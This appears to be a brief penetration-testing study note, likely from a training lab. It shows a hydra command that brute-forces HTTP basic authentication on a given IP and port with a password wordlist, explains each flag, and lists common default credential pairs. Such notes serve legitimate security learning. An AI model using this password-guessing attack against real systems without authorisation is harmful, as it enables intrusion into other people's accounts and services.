> basic auth

```bash
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 94.237.57.211 http-get / -s 40064 -f -t 16 -V
```
- `-l` = login name
- `-L` = list of usernames
- `-P` = password list
- `-s` = port
- `http-get` = attack module
- `-f` = stop on first found
- `-t 16` = 16 threads
- `-V` = verbose output


Common Passwords:

```bash
```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```
```